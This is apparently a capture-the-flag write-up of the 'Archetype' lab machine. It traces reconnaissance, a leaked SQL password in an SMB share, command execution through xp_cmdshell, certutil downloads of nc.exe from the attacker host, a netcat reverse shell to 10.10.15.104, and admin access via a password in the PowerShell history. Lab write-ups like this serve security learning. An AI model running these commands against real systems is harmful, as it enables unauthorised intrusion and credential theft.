# Archetype
> Remote: 10.129.58.39
> Remote: 10.129.46.106  (reset)
> Remote: 10.129.95.187  (reset)

> Local:  10.10.15.104
---

## Nmap
```
# nmap 10.129.58.39
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 13:47 EDT
Nmap scan report for 10.129.58.39
Host is up (0.048s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s

Nmap done: 1 IP address (1 host up) scanned in 1.02 seconds
```

```
# nmap -Pn -sS -sV -sC -O -p 1433 10.129.58.39
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 13:48 EDT
Nmap scan report for 10.129.58.39
Host is up (0.048s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info: 
|   10.129.58.39:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.58.39:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-05-12T17:39:52
|_Not valid after:  2054-05-12T17:39:52
|_ssl-date: 2024-05-12T17:49:05+00:00; +4s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
|_clock-skew: mean: 4s, deviation: 0s, median: 3s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.16 seconds
```

```
# nmap -Pn -sS -sV -sC -O -p 445 10.129.58.39
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 13:56 EDT
Nmap scan report for 10.129.58.39
Host is up (0.060s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-05-12T17:56:38
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-05-12T10:56:35-07:00
|_clock-skew: mean: 2h20m04s, deviation: 4h02m30s, median: 4s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.28 seconds
```

```# nmap -p445 --script smb-enum-shares 10.129.58.39
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 13:59 EDT
Nmap scan report for 10.129.58.39
Host is up (0.059s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.129.58.39\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.129.58.39\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.129.58.39\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.129.58.39\backups: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: READ
|_    Current user access: READ

Nmap done: 1 IP address (1 host up) scanned in 39.07 seconds
```

---

## smbclient login

```
# smbclient //10.129.58.39/backups -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                5056511 blocks of size 4096. 2560203 blocks available
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
smb: \> exit
```

`cat` the file to see the contents: 
```
# cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration> 
```
Contents: 
- Password=M3g4c0rp123
- User ID=ARCHETYPE\sql_svc
- Initial Catalog=Catalog
- Provider=SQLNCLI10.1
- Persist Security Info=True
- Auto Translate=False

---

## IMPacket: mssqlclient.py
```
# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.129.58.39
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> 
```

Typing `help` gets you a menu... 

What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell? 
- Answer: `xp_cmdshell` (executes cmd using xp_cmdshell)
- Example: `xp_cmdshell dir` runs `dir` as if from the cmd command line

What script can be used in order to search possible paths to escalate privileges on Windows hosts?
- Answer: winPEAS (Windows Privilege Escalation Awesome Scripts)
- [reference](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) | [video](https://youtu.be/66gOwXMnxRI?si=p-LAKUSdIk8ICMBT)
1. Copy desired files from the repo to your local/attack machine. Example: `winPEAS.bat` and/or `winPEASany.exe`
2. Spin up a Python web server in that subdir to serve up those files. Example: `python3 -m http.server 8888`
3. Upload those files to the Windows target. Example:
```
certutil -urlcache -f http://[target_ip]:[port]/winPEAS.bat C:\tmp\winPEAS.bat
certutil -urlcache -f http://[target_ip]:[port]/winPEAS.bat C:\tmp\winPEASany.exe
```
4. Run winPEAS. Example: `c:\tmp\winPEAS.bat`

Command I ran in this HTB: 
```
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell c:\tmp\winPEAS.bat
```

**Results:**( Massive amount of output (wait for it...)
- Didn't help much at all

---

## Walk-Through
- From the point where you can execute cmd commands via the SQL prompt (example: `xp_cmdshell whoami`).

## nc64.exe Reverse Shell
- Upload nc64.exe from attack machine to target machine and set up a reverse shell.
- I copied over the nc.exe file from Kali's /user/share and then spun up a python http.server.
- Then on the target...
```
xp_cmdshell certutil -urlcache -f http://10.10.15.104:80/nc.exe c:\tmp\nc.exe
```
- Then set up a listener on the local attack machine. On the target: 
```
xp_cmdshell c:\tmp\nc.exe 10.10.15.104 1234
```

## Flags

1. The user flag is on the user's Desktop (which I thought I checked via SQL).
```
C:\Users\sql_svc\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\sql_svc\Desktop

01/20/2020  06:42 AM    <DIR>          .
01/20/2020  06:42 AM    <DIR>          ..
02/25/2020  07:37 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,272,993,280 bytes free

C:\Users\sql_svc\Desktop>type user.txt
type user.txt
3e7b102e78218e935bf3f4951fec21a3
```

2. For the Admin flag, you have to PrivEsc to get into his subdir.
- This is where winPEAS comes into play (download it from the repo, upload it to the target, etc.).
- Here is the important part of the output I got when I ran itÑ
```
Checking PS history file
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F
NULL
 Directory of C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
NULL
03/17/2020  02:36 AM                79 ConsoleHost_history.txt
               1 File(s)             79 bytes
               0 Dir(s)  10,403,086,336 bytes free
```

So you should be able to `type` that file out to see the contents: 
```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>type ConsoleHost_history.txt
type ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

And now you have the admin password to login as admin...
- He used `psexec.py`: [PsExec](../../psexec.md) is a lightweight telnet-replacement developed by Microsoft that allows you to execute processes on remote Windows systems using any user's credentials.
```
cp /usr/share/doc/python3-impacket/examples/psexec.py psexec.py
./psexec.py Administrator@10.129.95.187
```
- Then just type the Admin flag...
```
c:\Users\Administrator\Desktop> type root.txt
b91ccec3305e98240082d4474b848528
```

![image](https://github.com/GregKedrovsky/Hacking/assets/26492233/7c01888c-8d01-4864-ae15-de076f55c471)
